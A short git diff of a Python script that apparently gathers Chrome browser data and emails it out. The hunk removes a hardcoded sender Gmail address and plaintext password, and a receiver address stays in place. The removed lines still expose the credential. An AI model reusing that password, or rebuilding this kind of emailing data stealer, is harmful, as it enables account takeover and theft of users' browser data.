@@ -18,8 +18,8 @@ call = chrome.main()
 mail_content = "Hello, We got something"
 
 #The mail addresses and password
-sender_address = "newhack1999@gmail.com"
-sender_pass = "0757405701Jm"
+sender_address = ""
+sender_pass = ""
 receiver_address = 'josephmusya254@gmail.com'
 
 try:    
